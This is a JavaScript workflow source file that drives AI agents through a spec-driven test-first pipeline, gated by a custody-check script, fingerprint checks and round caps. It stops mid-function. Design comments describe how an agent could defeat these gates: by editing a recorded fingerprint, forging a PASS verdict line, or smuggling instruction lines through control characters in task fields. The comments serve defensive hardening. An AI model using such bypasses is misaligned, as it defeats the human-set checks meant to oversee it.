export const meta = {
  name: 'stdd-execute',
  description:
    'Code-enforced STDD execute phase. Loads an approved STDD change, gates on the verdict line of scripts/stdd_custody_check.py (a program that reads spec.md and design-ux.md itself and compares their body hashes against the recorded fingerprints), then runs each task through RED / GREEN / verify / mark-done with a two-round fix cap, dispatches the stdd-lint mechanical checks (12 of the 13 catalogued in its checklist — S-31, the not-installed STOP rule, governs this caller instead), and stops at a manual-verification gate that only the calling session can clear.',
  whenToUse:
    'Use instead of the /stdd-execute skill when the custody chain and the verifier round cap must be enforced by code rather than by prose. Requires specs/<name>/spec.md with status: approved and an existing tasks.md. Pass {change: "<name>"}; re-invoke with {change, decision: {approved, confirmed: [ids]}} to produce the completion report after the manual gate.',
  phases: [
    {
      title: 'Load & custody gate',
      detail:
        'One agent runs scripts/stdd_custody_check.py and relays its single verdict line plus exit status verbatim; the script validates that line against a strict grammar and refuses to proceed on anything that is not an exact PASS. A second agent then reads tasks.md.'
    },
    {
      title: 'Execute tasks',
      detail:
        'A task already marked [wip] on entry (an interrupted prior run) is first probed by re-running its verificationCommand: exit 0 recovers it as a synthetic GREEN (no RED-checkpoint immutability compare, labeled accordingly in the completion report) and skips straight to verify; a non-zero result instead resets the task to unstarted, with read-back evidence the reset actually happened, before it is redone from RED. Each open task (scenario- or infra-kind; infra tasks currently flow through this identical full RED/GREEN/verify/done pipeline — the [INFRA] fast-path described in stdd-execute/SKILL.md is not implemented in this workflow, see isTddTask) then flows through RED, GREEN, verify and mark-done, with the fix-then-re-verify loop bounded to two rounds by the script, not by the agent. Skipped entirely on a re-invocation carrying a decision.'
    },
    {
      title: 'Lint',
      detail:
        'Dispatches the mechanical checks to the stdd-lint authority and gates on the structured findings; no check logic is reimplemented here.'
    },
    {
      title: 'Manual gate',
      detail:
        'Assembles the Manual verification checklist and returns REVIEW_REQUIRED with the artifacts. The script cannot ask the user anything.'
    },
    {
      title: 'Completion report',
      detail:
        'Only on re-invocation with an approval decision: emits the completion report, deriving the unconfirmed set from the checklist itself and refusing to claim completion without positive evidence.'
    }
  ]
};

// Hard bound on the fix-then-re-verify loop (mirrors the 2-round cap the
// prose skill asks the executing model to self-enforce).
const MAX_FIX_ROUNDS = 2;

// The custody comparison is NOT done here. It is done by a program that reads
// the files itself; this script only validates and gates on its verdict.
const CUSTODY_SCRIPT = 'scripts/stdd_custody_check.py';

const REPORT_CONTRACT =
  'Report contract: your final message is data for the caller. Give file:line for every claim, ' +
  'state anything you could not verify, and never paste file contents longer than 10 lines.';

// A change name is one path segment: no separators, no whitespace, no
// traversal. Validated here BEFORE the name reaches any prompt or any path,
// mirroring the same check inside the custody program. S-25/D-14: `.` and
// `..` match the bare character class but are traversal segments, not
// names — scripts/stdd_custody_check.py:177-180's `is_safe_name` already
// rejects them as a second check on top of the character class; the
// negative lookahead below folds that into this one regex so the exclusion
// lives in a single place rather than a separate `name !== '.' && ...` check
// duplicated alongside every use of CHANGE_NAME_RE.
const CHANGE_NAME_RE = /^(?!\.{1,2}$)[A-Za-z0-9._-]+$/;

// Adversarial-council finding D: changeDir is interpolated into the custody
// agent's shell command string (custodyCheck's step 3, below) and into
// prompt text, but the existing changeDir gate in run() only validated
// `.`/`..` path segments plus the final segment — an INTERMEDIATE segment
// could still carry a newline, `;`, `$()`, a backtick, or other shell
// metacharacters. This whole-path charset check runs before any of that
// interpolation happens. Space is deliberately excluded from the safe set
// too: it is not a metacharacter, but an unquoted shell command splits on
// whitespace, so a space-containing path is unsafe the same way.
const CHANGE_DIR_ILLEGAL_CHAR_RE = /[^A-Za-z0-9/._-]/;

// Every digest this script compares must be a full sha-256 hex digest after
// normalisation. An empty or truncated value is a blocker, never a skip.
const DIGEST_RE = /^[0-9a-f]{64}$/;

// The verdict grammar, taken from scripts/stdd_custody_check.py's module
// docstring: stdout is ALWAYS exactly one line; every field is a
// whitespace-free key=value token; each value is a 64-char lowercase hex
// digest or "-"; the reason token has the form <artifact>:<problem>; and the
// exit status always agrees with the verdict word (0 PASS / 1 FAIL).
// A PASS line can never carry "-" for the spec digests or "-" for the change
// name, because the program cannot reach PASS without having computed both
// and validated the name — so the PASS pattern demands the stronger shapes.
const CUSTODY_PASS_RE =
  /^CUSTODY: PASS change=([A-Za-z0-9._-]+) spec\.recorded=([0-9a-f]{64}) spec\.computed=([0-9a-f]{64}) design_ux\.recorded=([0-9a-f]{64}|-) design_ux\.computed=([0-9a-f]{64}|-)$/;
const CUSTODY_FAIL_RE =
  /^CUSTODY: FAIL reason=([A-Za-z0-9._-]+:[A-Za-z0-9._-]+) change=([A-Za-z0-9._-]+|-) spec\.recorded=([0-9a-f]{64}|-) spec\.computed=([0-9a-f]{64}|-) design_ux\.recorded=([0-9a-f]{64}|-) design_ux\.computed=([0-9a-f]{64}|-)$/;

// REQ-20 G-01/G-02 (spec.md:1085-1146): the custody script's second stdout
// line, one line beneath the CUSTODY: verdict, naming the true open/wip/
// done/manual/infra counts and the ordered id list of every formal task in
// tasks.md — a trusted-reader cross-check against whatever loadChange claims
// to have found. manual/infra are TAG subsets of open/wip/done, never a 4th
// and 5th mutually-exclusive category (G-01).
//
// v0.7.3 gap-closure (merged-task TASKS: line ambiguity): the inter-task
// separator in the `ids=` list is `;`, not `,` — a plain `,` is reserved for
// joining the sub-ids of a single M4 merged task (e.g. `S-03,S-04`). Before
// this, both separators were the same character, so a line naming one plain
// task plus one merged task (`ids=S-01,S-03,S-04`) could not be told apart
// from three plain tasks: every consumer that split on `,` saw 3 ids where
// only 2 tasks existed, so reconcileTaskCount falsely blocked every
// legitimate merged task and reorderTasksToTasksLine could never place one.
const TASKS_LINE_RE =
  /^TASKS: open=(\d+) wip=(\d+) done=(\d+) manual=(\d+) infra=(\d+) ids=([A-Za-z0-9._-]+(?:,[A-Za-z0-9._-]+)*(?:;[A-Za-z0-9._-]+(?:,[A-Za-z0-9._-]+)*)*)$/;

const TASK_MARKERS = ['todo', 'wip', 'done'];
const TASK_KINDS = ['scenario', 'infra', 'manual'];
const LINT_STATUSES = ['PASS', 'FAIL', 'SKIP', 'REPORT'];

// Adversarial-council finding J1 (round 3, 2026-07-28): task.title and
// task.verificationCommand reach prompt text the same way task.testFunction
// does (taskShapeBlockers' testFunction check, below), so a newline or other
// control character in either can smuggle an extra instruction line into a
// dispatch prompt — same injection class. Wider than the testFunction
// check's C0-only `/[\x00-\x1f]/`: also rejects C1 controls (\x7f-\x9f) and
// the Unicode line/paragraph separators U+2028/U+2029, which several
// renderers and parsers treat as line breaks despite sitting outside the
// ASCII control range.
const PROMPT_CONTROL_CHAR_RE = /[\x00-\x1f\x7f-\x9f\u2028\u2029]/;

// The 12 S-IDs `stdd-lint` actually emits on a run, per
// stdd-skills/stdd-lint/references/checklist.md's own table (verified
// 2026-07-28: S-31 there is explicitly the not-installed STOP rule that
// governs the CALLER, not stdd-lint itself — see this file's `!lint.installed`
// check above/below, which already enforces S-31 independently). This is a
// hardcoded MIRROR of that checklist, because this JS runtime cannot read
// files at runtime — checklist.md is the single source of truth; if it adds,
// removes, or renumbers a check, this list must be updated to match.
const EXPECTED_LINT_S_IDS = ['S-26', 'S-27', 'S-28', 'S-29', 'S-30', 'S-40', 'S-53', 'S-54', 'S-55', 'S-56', 'S-57', 'S-58'];

// M11-JS mirror of scripts/stdd_custody_check.py's TASKS_MISSING_LINE
// constant (verified 2026-07-28 against the live script: printed verbatim as
// the second stdout line when the change has no tasks.md, with the CUSTODY
// verdict itself still PASS/exit 0) — a literal, not a key=value line, so it
// never matches TASKS_LINE_RE and must not be read as malformed the same way
// a genuinely garbled line is; see readCustody's tasksLineAbsent split below.
const TASKS_MISSING_LINE = 'TASKS: missing';

const CUSTODY_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['verdictLine', 'exitCode', 'stderr', 'detail'],
  properties: {
    verdictLine: {
      type: 'string',
      description: 'the program\'s single stdout line, relayed byte for byte; "" if it printed none'
    },
    exitCode: { type: 'number', description: 'the exit status of that run, verbatim' },
    stderr: { type: 'string', description: 'the program\'s stderr, verbatim; "" if empty' },
    detail: { type: 'string', description: 'only for a failure to RUN the program at all; "" otherwise' },
    // REQ-20 G-02: not in `required` — an un-upgraded install of
    // stdd_custody_check.py only ever prints the CUSTODY: line, so this
    // field is legitimately absent, not just empty; readCustody below is
    // where that absence turns into a fail-closed BLOCKED (S-33).
    tasksLine: {
      type: 'string',
      description:
        'the program\'s second stdout line (TASKS: ...), relayed byte for byte; absent for an ' +
        'un-upgraded install that only ever printed one line'
    }
  }
};

const LOAD_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['timestamp', 'specStatus', 'designUxExists', 'tasks', 'manualChecklist', 'notes'],
  properties: {
    timestamp: { type: 'string', description: 'output of: date -u +%Y-%m-%dT%H:%M:%SZ' },
    specStatus: { type: 'string', description: 'spec.md frontmatter status, verbatim; "" if absent' },
    designUxExists: { type: 'boolean' },
    tasks: {
      type: 'array',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['id', 'title', 'marker', 'kind', 'testFile', 'testFunction', 'verificationCommand', 'targetKind'],
        properties: {
          id: {
            type: 'string',
            description:
              'the task line\'s first backtick token (S-XX for a scenario, or INFRA for the tag-only ' +
              '[INFRA] task) — never a task number'
          },
          title: { type: 'string' },
          // REQ-08/D-10 (spec.md:464-478): `enum` removed from marker/kind/
          // targetKind — the prompt (loadChange, above) tells the agent to
          // report the actual value rather than the nearest legal one, so an
          // enum here would either make taskShapeBlockers's fail-closed
          // branch unreachable (if the harness enforced it) or be pure
          // decoration (if it doesn't). taskShapeBlockers stays the sole gate
          // for marker/kind; targetKind remains unchecked, as it is today.
          marker: { type: 'string' },
          kind: { type: 'string' },
          testFile: { type: 'string' },
          testFunction: { type: 'string' },
          verificationCommand: { type: 'string' },
          targetKind: { type: 'string' },
          // M1 (token-reduction): OPTIONAL per-task fields so the RED/GREEN/
          // verify prompts can inline a verbatim excerpt instead of every
          // stage re-reading spec.md/design-*.md itself. Optional, not
          // required — an un-upgraded loadChange call (or a task the loader
          // could not confidently excerpt) simply omits them, and
          // gwtLooksValid's fail-open fallback below covers that case.
          gwt: {
            type: 'string',
            description:
              'verbatim copy of the `### REQ-XX:` section(s) containing this task\'s scenario(s) (siblings may ' +
              'ride along), including a GIVEN/WHEN/THEN block per scenario; "" if not captured'
          },
          designExcerpt: {
            type: 'string',
            description:
              'verbatim excerpt of design-be.md/design-fe.md paragraph(s) citing this task\'s scenario id(s) or ' +
              'their REQ id; the literal "none" when nothing matches or neither file exists'
          }
        }
      }
    },
    manualChecklist: {
      type: 'array',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['id', 'text'],
        properties: { id: { type: 'string' }, text: { type: 'string' } }
      }
    },
    notes: { type: 'string', description: 'anything ambiguous or unreadable; "" if nothing' }
  }
};

const RED_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['ok', 'redOutput', 'testFileHash', 'detail'],
  properties: {
    ok: { type: 'boolean', description: 'true only when the test failed for the intended behavioral reason' },
    redOutput: { type: 'string', description: 'the actual failing output, trimmed to the relevant lines' },
    testFileHash: { type: 'string', description: 'shasum -a 256 of the test file as written' },
    detail: { type: 'string' }
  }
};

const GREEN_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['ok', 'output', 'testFileHash', 'refactorNotes', 'detail'],
  properties: {
    ok: { type: 'boolean' },
    output: { type: 'string' },
    testFileHash: { type: 'string', description: 'shasum -a 256 of the test file at the END of this dispatch' },
    refactorNotes: { type: 'string' },
    detail: { type: 'string' }
  }
};

const VERIFY_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['pass', 'commandOutput', 'testFileHash', 'blockingDetail'],
  properties: {
    pass: { type: 'boolean' },
    commandOutput: { type: 'string' },
    testFileHash: { type: 'string' },
    blockingDetail: { type: 'string', description: '"" when pass is true' }
  }
};

const DONE_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['marked', 'markerLine', 'detail'],
  properties: {
    marked: { type: 'boolean' },
    markerLine: { type: 'string', description: "the task's line in tasks.md AFTER the edit, verbatim" },
    detail: { type: 'string' }
  }
};

const RESET_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['reset', 'markerLine', 'detail'],
  properties: {
    reset: { type: 'boolean' },
    markerLine: { type: 'string', description: "the task's line in tasks.md AFTER the edit, verbatim" },
    detail: { type: 'string' }
  }
};

// REQ-01/D-01: the interrupt-recovery discriminator — a probe-only re-run of
// task.verificationCommand, dispatched before resetWipStage decides which
// recovery branch to take.
const RERUN_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['exitCode', 'commandOutput', 'detail'],
  properties: {
    exitCode: { type: 'number', description: 'the exit status of re-running task.verificationCommand, verbatim' },
    commandOutput: { type: 'string', description: 'the actual command output, trimmed to the relevant lines' },
    detail: { type: 'string' }
  }
};

const FIX_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['changed', 'summary'],
  properties: {
    changed: { type: 'boolean' },
    summary: { type: 'string' }
  }
};

const LINT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['installed', 'findings', 'rawReport'],
  properties: {
    installed: { type: 'boolean', description: 'false when the stdd-lint skill is not available in this environment' },
    findings: {
      type: 'array',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['check', 'sId', 'status', 'evidence'],
        properties: {
          check: { type: 'string' },
          sId: { type: 'string' },
          // REQ-08/D-10: `enum` removed here too — run()'s own
          // `unknownStatuses` filter (below) is the sole fail-closed gate for
          // an out-of-set lint finding status.
          status: { type: 'string' },
          evidence: { type: 'string', description: 'file:line where the artifact structure allows it' }
        }
      }
    },
    rawReport: { type: 'string' }
  }
};

// --- helpers (pure, no host APIs) ------------------------------------------

// Fingerprints are compared as normalized hex: reported values may carry a
// "sha256:" prefix, surrounding quotes, or a trailing filename from shasum.
function normalizeHash(value) {
  if (typeof value !== 'string') {
    return '';
  }
  // S-22 fix: quote-stripping used to run on the whole trimmed string BEFORE
  // splitting on whitespace, so a quote sitting at the end of the first
  // token (not the end of the whole string, e.g. `"<hash>" file.txt`) was
  // never stripped and leaked into the normalized value. Split into tokens
  // first, then strip quotes from the token itself.
  const firstToken = value.trim().split(/\s+/)[0] || '';
  const unquoted = firstToken.replace(/^["']|["']$/g, '');
  return unquoted.replace(/^sha256:/i, '').toLowerCase();
}

// A digest is usable only when it is a full sha-256 after normalisation.
// Returns "" when it is usable, otherwise the blocking reason. An absent or
// malformed digest used to fail OPEN here (the guard was `if (hash && ...)`,
// so an empty string skipped the firewall entirely while still satisfying the
// schema) — it now blocks.
function digestProblem(label, value) {
  const digest = normalizeHash(value);
  if (!digest) {
    return `${label} is empty — a missing digest cannot satisfy the fingerprint firewall`;
  }
  if (!DIGEST_RE.test(digest)) {
    return `${label} is not a sha-256 digest (got "${truncate(digest, 80)}")`;
  }
  return '';
}

// M2: the task-level BLOCKED shape (`{task, status:'blocked', stage,
// detail}`) used to be hand-written at 13 separate call sites across the
// stage functions below — a missed copy at a 14th silently produced a
// differently-shaped object. Callers that need an extra field on top (e.g.
// verifyStage's `commandOutput`) still build on this base with
// Object.assign, rather than hand-writing the base fields again.
function taskBlocked(task, stage, detail) {
  return { task: task, status: 'blocked', stage: stage, detail: detail };
}

// M1: the fingerprint-firewall three-step (digest usability, then the
// RED-checkpoint compare) used to be duplicated verbatim between greenStage
// and verifyStage. Extracted here — verifyStage's `skipRedCompare` (set from
// its own `prev.recovery`) is the one point where the two callers actually
// differ (REQ-01: the GREEN-recovery path has no RED-checkpoint hash to
// compare against); greenStage always passes `false`. Returns the blocked()
// shape to return as-is, or null when the caller may proceed.
function fingerprintFirewall(task, stage, label, hash, redHash, skipRedCompare) {
  const problem = digestProblem(label, hash);
  if (problem) {
    return taskBlocked(task, stage, `fingerprint firewall cannot be checked: ${problem}`);
  }
  const afterHash = normalizeHash(hash);
  if (!skipRedCompare && afterHash !== redHash) {
    return taskBlocked(task, stage, `test file changed after the RED checkpoint (RED ${redHash}, now ${afterHash})`);
  }
  return null;
}

function truncate(value, limit) {
  const text = String(value === null || value === undefined ? '' : value);
  return text.length <= limit ? text : `${text.slice(0, limit)}...`;
}

// REQ-18 (S-23/S-24/S-31): parses the raw `run()` argument into one object
// exactly once, shared by changeNameOf/changeDirOf/decisionOf below — the
// JSON-string-serialized-args tolerance (RUN-2, S-31) used to live only
// inside changeNameOf, duplicated per accessor, so changeDir would have
// needed its own separate JSON.parse call reaching a different verdict on
// the same malformed input. `Object.prototype.hasOwnProperty` on the result
// is how `changeDirOf` distinguishes "caller omitted changeDir" (bare-string
// args, or an object with no `changeDir` key) from "caller supplied an
// explicit falsy changeDir" — both now BLOCK the same way (S-23), there is
// no legacy `STDD/<name>` fallback left in `run()`'s normal path.
function parsedArgs(input) {
  if (typeof input === 'string') {
    const trimmed = input.trim();
    // Observed twice in live runs (RUN-2, S-31): the Workflow tool serializes
    // an object argument into a JSON string before it reaches run(). Only
    // `{`-prefixed strings are attempted as JSON — anything else is a bare
    // change name and must not pay the JSON.parse cost. A parse failure falls
    // through to the existing bare-name handling deterministically (no throw,
    // no special-casing): the malformed string itself becomes the "name" and
    // is rejected by CHANGE_NAME_RE below, same as before this change.
    if (trimmed.startsWith('{')) {
      try {
        const parsed = JSON.parse(trimmed);
        if (parsed && typeof parsed === 'object') {
          return parsed;
        }
      } catch (err) {
        // fall through — treat the raw string as a literal (invalid) name
      }
    }
    return { change: trimmed };
  }
  if (input && typeof input === 'object') {
    return input;
  }
  return {};
}

function changeNameOf(parsed) {
  return String(parsed.change || parsed.changeName || parsed.name || '').trim();
}

// REQ-18/F-02 (D-14): the last path segment of a confirmed changeDir, with
// trailing separators stripped first so `/a/b/` yields `b`, never `''`. Pure
// string helper — never touches fs, so it is testable directly from the
// `.mjs` harness (tasks.md:65: `lastSegment` is one of the layered-extraction
// symbols this harness binds once it lands here).
function lastSegment(dirPath) {
  const trimmed = String(dirPath === null || dirPath === undefined ? '' : dirPath).replace(/[\\/]+$/, '');
  const idx = Math.max(trimmed.lastIndexOf('/'), trimmed.lastIndexOf('\\'));
  return idx === -1 ? trimmed : trimmed.slice(idx + 1);
}

// REQ-18: `undefined` when the caller's parsed args carry no `changeDir` key
// at all (bare-string args, or an object with no `changeDir` key) —
// deliberately distinct from an explicit `''`/other falsy value, but both
// BLOCK the same way in run() (S-23): there is no directory to derive either
// way once the key is absent.
function changeDirOf(parsed) {
  return Object.prototype.hasOwnProperty.call(parsed, 'changeDir') ? parsed.changeDir : undefined;
}

function decisionOf(parsed) {
  if (parsed && typeof parsed === 'object' && parsed.decision) {
    return parsed.decision;
  }
  return null;
}

// M3a (token-reduction): an optional caller-supplied hash of the change's
// input files, threaded verbatim into the custody/load/wip-probe prompts so
// a fresh dispatch can recognise a rerun against unchanged inputs without
// re-deriving the hash itself. Purely additive — absent when the caller
// omits it, never invented.
function inputsHashOf(parsed) {
  return typeof parsed.inputsHash === 'string' && parsed.inputsHash ? parsed.inputsHash : undefined;
}

// --- phase 0: custody gate + load -----------------------------------------

// Why the comparison is not done here: this runtime has no filesystem, so the
// only way JavaScript could "compare" a recorded fingerprint against a
// recomputed body hash is to ask an agent for BOTH strings and compare those.
// Both sides then come from one source that holds Bash, and one in-place edit
// of the recorded field makes the comparison pass. So the comparison lives in
// a program that reads the files itself, and the agent is demoted to a relay.
//
// HONEST LIMIT, stated so no reader over-reads this gate: a relayed line is
// still in principle forgeable. An agent that chose to fabricate a PASS line
// and a matching exit status would get past the parser below. This raises the
// bar — it removes the trivial single-edit bypass and makes the comparison
// unit-testable in CI — it is not a wall. The custody program carries its own
// residual hole too (a self-consistent forgery, body and fingerprint rewritten
// together, still reads as PASS); closing either needs a trust anchor outside
// the working tree, which the custody chain does not have.
// REQ-07 (spec.md:392-427, D-13): search locations, IN ORDER, that
// custodyCheck asks the relay agent to try before giving up. Kept as one
// array constant (rather than four separate string-concatenation call
// sites) so a fifth location, if one is ever needed, is a one-line addition.
// Location (d) is new (S-09): an install done only via
// `claude plugin add twjohnwu/tlor-orchestration`, which never ran
// install.sh or tlor-init Step 11, has stdd_custody_check.py ONLY under the
// plugin's own cache/marketplace directory — verified on this machine's own
// `~/.claude/plugins/installed_plugins.json`, every entry's `installPath` is
// `~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/...`; the
// version segment is not knowable in advance, hence the glob rather than a
// literal path.
const CUSTODY_SEARCH_LOCATIONS = [
  `\`${CUSTODY_SCRIPT}\` relative to the project root (repo-local development copy)`,
  '`~/.claude/scripts/stdd_custody_check.py` (user-level install)',
  '`.claude/scripts/stdd_custody_check.py` relative to the project root (project-level install)',
  'the plugin\'s own installed directory — glob ' +
    '`~/.claude/plugins/cache/*/tlor-orchestration/*/scripts/stdd_custody_check.py` and ' +
    '`~/.claude/plugins/marketplaces/*/scripts/stdd_custody_check.py`, taking the first match ' +
    '(covers an install done only via `claude plugin add twjohnwu/tlor-orchestration`, which never ' +
    'ran install.sh or tlor-init Step 11)'
];

// Second, independent layer on top of CHANGE_DIR_ILLEGAL_CHAR_RE above:
// single-quotes a value for safe interpolation into a shell command string.
// changeDir can no longer carry a `'` by the time it reaches here (it is not
// in the allowed charset), but this stays a correct, generic quoting
// primitive rather than relying solely on the charset gate (belt and braces).
function singleQuoteShell(value) {
  return "'" + String(value).replace(/'/g, "'\\''") + "'";
}

async function custodyCheck(changeDir, inputsHash) {
  return await agent(
    [
      `Run the STDD custody check for the confirmed change directory "${changeDir}" and relay its verdict. You are a relay, not a judge.`,
      ...(inputsHash ? [`input-files hash: ${inputsHash}`] : []),
      '',
      '1. Find the program, checking these locations IN ORDER with a real existence test ' +
        '(e.g. `test -f`) before running anything — stop at the first one that exists:',
      ...CUSTODY_SEARCH_LOCATIONS.map((loc, idx) => `   ${String.fromCharCode(97 + idx)}. ${loc}`),
      '2. Resolve that location to a concrete, fully-expanded path yourself BEFORE running it — ' +
        'never let `~` or a variable reach the shell unexpanded. A path that fails to expand ' +
        'silently becomes empty, and running an empty path is a known trap in this codebase: it ' +
        'must never be mistaken for "program not found" being handled, so check the expansion, ' +
        'not just the command\'s exit status.',
      `3. Run: \`python3 <the resolved path> --change-dir ${singleQuoteShell(changeDir)}\` (REQ-07's primary CLI mode — ` +
        'do not use the positional `<name> --root <dir>` legacy form).',
      '4. Put its FIRST stdout line into verdictLine EXACTLY as printed, byte for byte. Do not reformat it, re-order or re-case its tokens, drop or add whitespace, expand or shorten a value, summarise it, or repair it. If it printed nothing at all, return "".',
      '5. If a second stdout line exists (a `TASKS: ...` line), put it into tasksLine EXACTLY as printed, byte for byte; "" if there is no second line.',
      '6. Put that run\'s exit status into exitCode, verbatim (read it immediately after the run, before any other command).',
      '7. Put its stderr into stderr, verbatim.',
      '8. If none of the locations exist, or the program cannot be executed at all, return verdictLine="" and explain why in detail. Do NOT substitute your own reading of the custody chain, and do not compute any hash yourself: an absent verdict is a refusal, not a pass.',
      '',
      'Make NO edits in this dispatch. Do not write, create, move or delete any file. In particular do not touch spec.md, design-ux.md, tasks.md or any frontmatter field — the caller parses the line you relay and decides on its own.',
      REPORT_CONTRACT
    ].join('\n'),
    {
      label: 'custody-check',
      phase: 'Load & custody gate',
      schema: CUSTODY_SCHEMA,
      agentType: 'rohirrim-outrider'
    }
  );
}

// The custody gate, in JavaScript: strict grammar validation of the relayed
// line, then agreement between the verdict word and the exit status. Anything
// that is not an exact PASS is a blocker — a malformed, truncated, multi-line
// or absent line must never read as a pass.
function readCustody(relay, name) {
  const empty = {
    specRecorded: '-',
    specComputed: '-',
    designUxRecorded: '-',
    designUxComputed: '-'
  };

  // REQ-20 G-02/G-04 (S-33): a `tasksLine` that is absent (an un-upgraded
  // stdd_custody_check.py that never printed a second line) or present but
  // not matching TASKS_LINE_RE (malformed) is recorded here as a named
  // problem string, never silently ignored — the caller (run()) is what
  // turns it into the fail-closed `custody` / `load:no-task-count` BLOCKED,
  // kept separate from `blockers` below because it names a different stage.
  const tasksLineRaw = String(relay && (relay.tasksLine !== null && relay.tasksLine !== undefined) ? relay.tasksLine : '').trim();
  // M11-JS: "absent" (nothing was produced — either the field itself is
  // missing/empty, an un-upgraded install, or the script's own
  // TASKS_MISSING_LINE literal for "no tasks.md exists") is a DIFFERENT
  // problem from "malformed" (something was produced but does not parse as
  // TASKS_LINE_RE — a corrupted or out-of-grammar line). The caller (run())
  // turns this split into the distinct reasons `load:tasks-line-missing` vs
  // `load:no-task-count`.
  const tasksLineAbsent = tasksLineRaw === '' || tasksLineRaw === TASKS_MISSING_LINE;
  const tasksLineProblem = TASKS_LINE_RE.test(tasksLineRaw)
    ? null
    : `${CUSTODY_SCRIPT} produced ${tasksLineAbsent ? 'no' : 'a malformed'} TASKS: count line, so the true task total is unverified. ` +
      `Relayed: "${truncate(tasksLineRaw, 200) || '(nothing)'}"`;

  if (!relay) {
    return {
      blockers: [`the custody dispatch returned nothing — no ${CUSTODY_SCRIPT} verdict to check`],
      fingerprints: empty,
      verdictLine: '',
      tasksLineProblem: tasksLineProblem,
      tasksLineAbsent: tasksLineAbsent
    };
  }

  const line = String(relay.verdictLine === null || relay.verdictLine === undefined ? '' : relay.verdictLine).trim();
  const detail = String(relay.detail === null || relay.detail === undefined ? '' : relay.detail).trim();
  const context = detail ? ` (relay detail: ${truncate(detail, 300)})` : '';

  const pass = CUSTODY_PASS_RE.exec(line);
  const fail = CUSTODY_FAIL_RE.exec(line);

  if (!pass && !fail) {
    return {
      blockers: [
        `${CUSTODY_SCRIPT} produced no well-formed verdict line, so the custody chain is unverified; ` +
          `refusing to read the absence of a FAIL as a pass. Relayed: "${truncate(line, 200) || '(nothing)'}"${context}`
      ],
      fingerprints: empty,
      verdictLine: line,
      tasksLineProblem: tasksLineProblem,
      tasksLineAbsent: tasksLineAbsent
    };
  }

  const fingerprints = pass
    ? {
        specRecorded: pass[2],
        specComputed: pass[3],
        designUxRecorded: pass[4],
        designUxComputed: pass[5]
      }
    : {
        specRecorded: fail[3],
        specComputed: fail[4],
        designUxRecorded: fail[5],
        designUxComputed: fail[6]
      };

  const blockers = [];
  const expectedExit = pass ? 0 : 1;
  if (relay.exitCode !== expectedExit) {
    blockers.push(
      `custody verdict word and exit status disagree: the line says ${pass ? 'PASS' : 'FAIL'} ` +
        `(exit ${expectedExit}) but the relayed exit status was ${JSON.stringify(relay.exitCode)} — ` +
        'one of the two was altered on the way here'
    );
  }

  if (fail) {
    blockers.push(`custody chain FAILED: ${fail[1]} (verdict line reports change=${fail[2]})`);
  } else {
    if (pass[1] !== name) {
      blockers.push(`custody verdict is for change "${pass[1]}", not the requested "${name}"`);
    }
    // Belt and braces: the program cannot emit a PASS whose digests differ, so
    // a line that does is either a forgery or a grammar drift — both blockers.
    if (fingerprints.specRecorded !== fingerprints.specComputed) {
      blockers.push(
        `custody PASS line is self-inconsistent: spec.recorded ${fingerprints.specRecorded} != spec.computed ${fingerprints.specComputed}`
      );
    }
    if (fingerprints.designUxRecorded !== fingerprints.designUxComputed) {
      blockers.push(
        `custody PASS line is self-inconsistent: design_ux.recorded ${fingerprints.designUxRecorded} != design_ux.computed ${fingerprints.designUxComputed}`
      );
    }
  }

  return {
    blockers: blockers,
    fingerprints: fingerprints,
    verdictLine: line,
    tasksLineProblem: tasksLineProblem,
    tasksLineAbsent: tasksLineAbsent
  };
}

async function loadChange(changeDir, inputsHash) {
  return await agent(
    [
      `Read the STDD change at ${changeDir} and return its state. Read-only: do not write or edit any file.`,
      ...(inputsHash ? [`input-files hash: ${inputsHash}`] : []),
      '',
      'Do exactly this:',
      `1. Read ${changeDir}/spec.md's frontmatter and return its \`status\` field verbatim ("" if absent). Do not recompute or report any fingerprint — a separate program owns the custody comparison.`,
      `2. Report whether ${changeDir}/design-ux.md exists.`,
      `3. Read ${changeDir}/tasks.md and return every formal task line in FILE ORDER (never reorder or group them — the Nth entry of your returned array must be the Nth such line top-to-bottom in the file): its id — id is the FIRST backtick token on that task line (e.g. \`S-12\`, or \`INFRA\` for the tag-only [INFRA] task) — NEVER a task number, title, marker — the checkbox is the bracket token at the very start of the task line, before that first backtick token; a bracket token appearing later on the line — including one inside the title — is never the checkbox, even if the title's own wording is about that bracket state — map the checkbox to the word the caller expects: \`[ ]\` -> "todo", \`[wip]\` -> "wip", \`[x]\` -> "done"; if a task's checkbox is some other bracket token, report that raw token string verbatim instead of guessing which of the three it means — kind (scenario / infra for [INFRA] / manual for [MANUAL]), the exact test file and test function name it names, its exact verification command, and targetKind — the task line's [NEW]/[MODIFY] tag, reported as "new" or "modify" ("unmarked" if the line carries neither).`,
      `4. Return every entry of tasks.md's "Manual verification checklist" section.`,
      '5. Return the output of `date -u +%Y-%m-%dT%H:%M:%SZ` as the timestamp.',
      `6. For each scenario/infra task, also capture \`gwt\`: the verbatim text of the \`### REQ-XX:\` section(s) in ${changeDir}/spec.md that contain this task's scenario id(s) (a sibling scenario under the same REQ heading may ride along). Copy it verbatim — do not summarize, paraphrase or reformat it. Leave gwt as "" if you cannot confidently locate it.`,
      `7. For each scenario/infra task, also capture \`designExcerpt\`: read ${changeDir}/design-be.md and ${changeDir}/design-fe.md if either exists, and copy verbatim — do not summarize or paraphrase — any paragraph(s) that cite this task's scenario id(s) or their REQ id, capped at roughly 40 lines (add one truncation note line if you cut it short). Report the literal string "none" if neither file exists or nothing in them matches.`,
      '',
      'Report a field verbatim or as "" — never invent, normalize or repair a value. For marker, apply the mapping in step 3 above and only fall back to the raw bracket text for an other bracket token outside those three. If a task\'s kind is something other than the listed values, report what is actually there rather than the nearest legal value; the caller blocks on an unrecognised marker or kind instead of guessing.',
      REPORT_CONTRACT
    ].join('\n'),
    {
      label: 'load-change',
      phase: 'Load & custody gate',
